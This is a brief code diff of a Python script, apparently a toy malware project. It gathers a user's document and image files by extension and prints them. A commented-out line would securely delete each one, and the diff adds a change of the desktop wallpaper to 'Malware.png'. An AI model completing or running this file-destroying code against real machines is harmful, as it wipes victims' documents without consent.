@@ -1,6 +1,7 @@
 import os
 import secure_delete
 import re
+from wallpaper import cambiarFondo
 
 archivos = []
 pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')
@@ -18,3 +19,4 @@ listar_archivos_documentos(archivos)
 for archivo in archivos:
     print(archivo)
     # secure_delete.delete(archivo)
+cambiarFondo("Malware.png")
